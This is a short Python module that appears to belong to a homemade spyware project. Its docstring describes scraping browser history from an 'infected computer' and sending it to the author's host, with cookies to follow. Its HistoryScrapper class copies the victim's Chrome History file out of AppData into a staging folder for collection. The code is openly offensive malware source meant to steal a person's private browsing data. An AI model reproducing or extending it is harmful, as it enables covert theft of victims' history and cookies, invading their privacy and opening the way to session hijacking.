from datetime import datetime
from shutil import copyfile

import fileManager
from localization import Localization
from properties import APPDATA_PATH

"""
Tool for scrapping history from infected computer and then sending it to host computer
Browser history is located in:
AppData\\Local\\Google\\Chrome\\User Data\\Default\History
As well as other interesting files as "Top sites" etc.

I do not know how to open the file but i want try to load them and replace history file in my computer with one i got from
infected computer. Maybe then when i press history in browser i will see his history.

The same should apply for the cookie
"""
dir_name = "history"


class HistoryScrapper:

    def __init__(self):
        pass

    @classmethod
    def obtain_history(cls):
        filename = str(datetime.now())
        filename = filename.replace(":", "_").replace("-", " ")

        src = APPDATA_PATH[:-8] + "\\Local\\Google\\Chrome\\User Data\\Default\\History"
        dest = Localization.get_path(Localization.APPDATA) + dir_name
        fileManager.make_road(dest)
        copyfile(src, dest + "\\" + filename)

# hs = HistoryScrapper()
# hs.obtain_history()